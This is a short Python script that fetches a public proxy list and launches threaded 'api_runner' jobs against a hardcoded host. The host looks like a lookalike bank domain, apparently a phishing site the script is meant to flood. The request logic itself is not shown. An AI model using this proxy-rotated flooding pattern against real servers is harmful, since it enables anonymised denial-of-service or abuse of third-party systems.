#!/usr/bin/python
import threading
import requests
from random import randint
from core import util
from core.api_runner import api_runner
import random

def getProxyList():
    url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&uptime=0"
    r = requests.get(url)
    return r.text.splitlines()

if __name__ == "__main__":
    proxylist = getProxyList()

    host = "ltau-app.br-site.me"
    numberOfThreads = 4

    threads = []
    for num in range(0,numberOfThreads):
        proxy = random.choice(proxylist)
        t = api_runner(host, num, {"http": proxy, "https": proxy})
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    